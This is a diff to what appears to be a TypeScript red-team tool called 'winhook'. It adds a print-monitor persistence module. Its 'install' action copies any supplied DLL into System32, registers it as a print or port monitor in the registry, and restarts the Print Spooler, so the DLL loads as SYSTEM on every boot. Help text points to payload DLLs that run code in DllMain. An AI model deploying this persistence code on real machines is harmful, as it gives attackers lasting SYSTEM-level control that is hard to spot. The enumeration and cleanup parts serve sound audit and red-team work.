@@ -22024,6 +22024,242 @@ Write-Output "    reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Se
   return { output: output.join("\n"), findings }
 }
 
+async function printMonitorPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const name = argVal(args, "--name") || "CyberStrikeMon"
+  const dllPath = argVal(args, "--dll")
+  const monType = argVal(args, "--type") || "monitor"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Print Monitor/Port Monitor persistence...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Print Monitor Enumeration ==="
+Write-Output ""
+
+# Enumerate print monitors
+Write-Output "--- Print Monitors (HKLM\\SYSTEM\\CCS\\Control\\Print\\Monitors) ---"
+$monPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors'
+$monitors = Get-ChildItem $monPath -ErrorAction SilentlyContinue
+$monCount = 0
+foreach ($mon in $monitors) {
+  $monCount++
+  $driver = (Get-ItemProperty "$($mon.PSPath)" -Name Driver -ErrorAction SilentlyContinue).Driver
+  Write-Output "  $($mon.PSChildName)"
+  Write-Output "    Driver DLL: $driver"
+  if ($driver) {
+    $dllFullPath = "$env:SystemRoot\\System32\\$driver"
+    if (Test-Path $dllFullPath) {
+      $info = Get-Item $dllFullPath
+      Write-Output "    Size: $($info.Length) bytes"
+      Write-Output "    Modified: $($info.LastWriteTime)"
+      $sig = Get-AuthenticodeSignature $dllFullPath -ErrorAction SilentlyContinue
+      Write-Output "    Signed: $(if ($sig.Status -eq 'Valid') { "$($sig.SignerCertificate.Subject)" } else { 'UNSIGNED [!]' })"
+    } else {
+      Write-Output "    [!] DLL NOT FOUND at expected path"
+    }
+  }
+  Write-Output ""
+}
+Write-Output "MONITOR_COUNT=$monCount"
+
+# Enumerate port monitors
+Write-Output "--- Port Monitors (HKLM\\SYSTEM\\CCS\\Control\\Print\\Monitors\\*\\Ports) ---"
+$portCount = 0
+foreach ($mon in $monitors) {
+  $ports = Get-ChildItem "$($mon.PSPath)\\Ports" -ErrorAction SilentlyContinue
+  foreach ($port in $ports) {
+    $portCount++
+    Write-Output "  $($mon.PSChildName)\\$($port.PSChildName)"
+  }
+}
+Write-Output "PORT_COUNT=$portCount"
+Write-Output ""
+
+# Print Spooler service status
+Write-Output "=== Print Spooler Service ==="
+$spooler = Get-Service Spooler
+Write-Output "Status: $($spooler.Status)"
+Write-Output "StartType: $($spooler.StartType)"
+Write-Output "SPOOLER_RUNNING=$(if ($spooler.Status -eq 'Running') { '1' } else { '0' })"
+
+# Check if current user can modify monitors
+Write-Output ""
+Write-Output "=== Permissions ==="
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Output "Is Admin: $isAdmin"
+Write-Output "CAN_INSTALL=$(if ($isAdmin) { '1' } else { '0' })"
+
+# Check for suspicious unsigned monitors
+$unsigned = 0
+foreach ($mon in $monitors) {
+  $driver = (Get-ItemProperty "$($mon.PSPath)" -Name Driver -ErrorAction SilentlyContinue).Driver
+  if ($driver) {
+    $dllFullPath = "$env:SystemRoot\\System32\\$driver"
+    if (Test-Path $dllFullPath) {
+      $sig = Get-AuthenticodeSignature $dllFullPath -ErrorAction SilentlyContinue
+      if ($sig.Status -ne 'Valid') { $unsigned++ }
+    }
+  }
+}
+if ($unsigned -gt 0) {
+  Write-Output ""
+  Write-Output "[!] Found $unsigned unsigned monitor DLLs — possible existing persistence"
+  Write-Output "UNSIGNED=$unsigned"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const unsigned = r.stdout.match(/UNSIGNED=(\d+)/)
+    if (unsigned && parseInt(unsigned[1]) > 0) {
+      findings.push({
+        checkId: "WIN-PMON-001",
+        provider: "windows",
+        severity: "high",
+        status: "SUSPICIOUS",
+        resource: "spooler://monitors",
+        title: `${unsigned[1]} unsigned print monitor DLL(s) found — possible existing persistence`,
+        details: "Unsigned DLLs in print monitor registry may indicate existing malicious persistence. Legitimate monitors are typically signed by their vendor.",
+        remediation: "Investigate unsigned monitor DLLs, verify against known-good baseline.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!dllPath) {
+      output.push("ERROR: --dll required (path to DLL to register as print monitor)")
+      output.push("")
+      output.push("The DLL must export these functions:")
+      output.push("  - InitializePrintMonitor2 (for print monitors)")
+      output.push("  - InitializePortMonitor (for port monitors)")
+      output.push("")
+      output.push("Or use a payload DLL that runs code in DllMain on PROCESS_ATTACH.")
+      output.push("The DLL will be loaded by spoolsv.exe (SYSTEM context) on service start.")
+      return { output: output.join("\n"), findings }
+    }
+
+    const regPath = monType === "port"
+      ? `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}\\Ports`
+      : `HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`
+
+    const script = `
+Write-Output "=== Installing ${monType === "port" ? "Port" : "Print"} Monitor ==="
+Write-Output "Name: ${name}"
+Write-Output "DLL: ${dllPath}"
+Write-Output ""
+
+# Verify admin
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+  Write-Output "[-] ERROR: Administrator privileges required"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Verify DLL exists
+if (-not (Test-Path '${dllPath}')) {
+  Write-Output "[-] DLL not found: ${dllPath}"
+  Write-Output "STATUS=FAILED"
+  exit
+}
+
+# Copy DLL to System32 (required location for print monitors)
+$dllName = [System.IO.Path]::GetFileName('${dllPath}')
+$destPath = "$env:SystemRoot\\System32\\$dllName"
+Copy-Item '${dllPath}' $destPath -Force
+Write-Output "[+] DLL copied to: $destPath"
+
+# Create registry key
+$regPath = '${regPath}'
+New-Item -Path $regPath -Force | Out-Null
+Set-ItemProperty -Path '${regPath.replace("\\Ports", "")}' -Name Driver -Value $dllName -Type String
+
+Write-Output "[+] Registry key created: ${regPath.replace("\\Ports", "").replace("HKLM:\\", "HKLM\\")}"
+Write-Output "[+] Driver value set to: $dllName"
+Write-Output ""
+
+# Restart Spooler to load the monitor
+Write-Output "[*] Restarting Print Spooler service to load monitor..."
+Restart-Service Spooler -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+$spooler = Get-Service Spooler
+Write-Output "[+] Spooler Status: $($spooler.Status)"
+
+# Verify DLL is loaded
+$spoolPid = (Get-Process spoolsv -ErrorAction SilentlyContinue).Id
+if ($spoolPid) {
+  $loaded = Get-Process -Id $spoolPid -Module -ErrorAction SilentlyContinue | Where-Object { $_.ModuleName -eq $dllName }
+  if ($loaded) {
+    Write-Output "[+] DLL confirmed loaded in spoolsv.exe (PID: $spoolPid)"
+    Write-Output "STATUS=SUCCESS"
+  } else {
+    Write-Output "[*] DLL not immediately visible in modules (may still be loaded)"
+    Write-Output "STATUS=INSTALLED"
+  }
+} else {
+  Write-Output "[-] Spooler process not found after restart"
+  Write-Output "STATUS=SPOOLER_FAILED"
+}
+
+Write-Output ""
+Write-Output "[+] Persistence installed: DLL loads as SYSTEM on every Spooler start"
+Write-Output "[*] Survives reboots (Spooler is auto-start)"
+Write-Output "[*] Cleanup: winhook print_monitor_persist --action remove --name '${name}'"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("STATUS=SUCCESS") || r.stdout.includes("STATUS=INSTALLED")) {
+      findings.push({
+        checkId: "WIN-PMON-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `spooler://${name}`,
+        title: `Print monitor persistence installed: ${name}`,
+        details: `DLL registered as ${monType} monitor, loaded by spoolsv.exe as SYSTEM. Survives reboots.`,
+        remediation: `Remove: winhook print_monitor_persist --action remove --name '${name}'`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    const script = `
+Write-Output "=== Removing Print Monitor ==="
+
+$regPath = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}'
+
+# Get DLL name before removing
+$driver = (Get-ItemProperty $regPath -Name Driver -ErrorAction SilentlyContinue).Driver
+if (-not $driver) {
+  Write-Output "[-] Monitor '${name}' not found"
+  exit
+}
+
+# Remove registry key
+Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Registry key removed: $regPath"
+
+# Remove DLL from System32
+$dllPath = "$env:SystemRoot\\System32\\$driver"
+if (Test-Path $dllPath) {
+  Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] DLL removed: $dllPath"
+}
+
+# Restart Spooler
+Restart-Service Spooler -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Spooler restarted"
+Write-Output "[+] Monitor '${name}' removed successfully"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -25659,6 +25895,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   golden_gmsa: goldenGmsa,
   silver_saml: silverSaml,
   rdp_shadow: rdpShadow,
+  print_monitor_persist: printMonitorPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
